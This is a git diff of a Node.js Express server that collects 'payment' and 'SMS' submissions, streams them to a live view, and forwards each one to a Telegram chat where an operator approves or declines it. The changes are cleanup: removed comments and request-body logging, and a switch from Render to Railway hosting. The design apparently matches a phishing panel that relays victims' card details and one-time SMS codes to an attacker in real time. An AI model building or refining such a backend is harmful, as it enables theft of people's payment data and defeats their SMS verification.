@@ -41,7 +41,6 @@ function writeState(state) {
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-/* ---- Real-time subscribers (SSE) ---- */
 const clients = new Set();
 
 function broadcast(state) {
@@ -51,7 +50,6 @@ function broadcast(state) {
   }
 }
 
-/* ---- Telegram helpers ---- */
 async function tgSend(method, body) {
   if (!TELEGRAM_BOT_TOKEN) {
     console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
@@ -121,8 +119,6 @@ async function sendSmsToTelegram(sub) {
   });
 }
 
-/* ---- Endpoints ---- */
-
 app.get('/health', (req, res) => {
   res.status(200).json({
     status: 'ok',
@@ -146,9 +142,7 @@ app.get('/api/stream', (req, res) => {
     'Access-Control-Allow-Origin': '*'
   });
   res.flushHeaders();
-
   res.write(`data: ${JSON.stringify(readState())}\n\n`);
-
   clients.add(res);
 
   const ping = setInterval(() => {
@@ -171,11 +165,6 @@ app.post('/api/state', (req, res) => {
 });
 
 app.post('/api/submit-payment', async (req, res) => {
-  console.log('=== SUBMIT-PAYMENT ===');
-  console.log('Token set?', !!TELEGRAM_BOT_TOKEN);
-  console.log('Chat ID set?', !!TELEGRAM_CHAT_ID);
-  console.log('Body:', JSON.stringify(req.body));
-
   const submission = {
     ...req.body,
     id: 'REQ-' + Date.now(),
@@ -190,16 +179,11 @@ app.post('/api/submit-payment', async (req, res) => {
   writeState(state);
   broadcast(state);
 
-  const tgResult = await sendSubmissionToTelegram(submission);
-  console.log('[tg] result ok?', tgResult && tgResult.ok);
-
+  await sendSubmissionToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
 
 app.post('/api/submit-sms', async (req, res) => {
-  console.log('=== SUBMIT-SMS ===');
-  console.log('Body:', JSON.stringify(req.body));
-
   const submission = {
     ...req.body,
     id: 'SMS-' + Date.now(),
@@ -214,9 +198,7 @@ app.post('/api/submit-sms', async (req, res) => {
   writeState(state);
   broadcast(state);
 
-  const tgResult = await sendSmsToTelegram(submission);
-  console.log('[tg] sms result ok?', tgResult && tgResult.ok);
-
+  await sendSmsToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
 
@@ -260,7 +242,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
   const data = cb.data || '';
   const [action, refId] = data.split(':');
-
   const state = readState();
 
   if (action === 'approve' || action === 'decline') {
@@ -268,8 +249,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
     if (!current || (refId && current.id !== refId)) {
       await tgSend('answerCallbackQuery', {
         callback_query_id: cb.id,
-        text: 'This submission is no longer active.',
-        show_alert: false
+        text: 'This submission is no longer active.'
       });
       return;
     }
@@ -308,8 +288,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
     if (!current || (refId && current.id !== refId)) {
       await tgSend('answerCallbackQuery', {
         callback_query_id: cb.id,
-        text: 'This SMS submission is no longer active.',
-        show_alert: false
+        text: 'This SMS submission is no longer active.'
       });
       return;
     }
@@ -345,17 +324,20 @@ app.post('/api/telegram/webhook', async (req, res) => {
 
   await tgSend('answerCallbackQuery', {
     callback_query_id: cb.id,
-    text: 'Unknown action',
-    show_alert: false
+    text: 'Unknown action'
   });
 });
 
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) return;
 
-  const publicUrl = process.env.RENDER_EXTERNAL_URL;
+  // Railway sets RAILWAY_PUBLIC_DOMAIN automatically
+  let publicUrl = process.env.RAILWAY_PUBLIC_DOMAIN
+    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}`
+    : null;
+
   if (!publicUrl) {
-    console.warn('[tg] RENDER_EXTERNAL_URL not set — skipping webhook registration');
+    console.warn('[tg] RAILWAY_PUBLIC_DOMAIN not set — skipping webhook registration');
     return;
   }
 
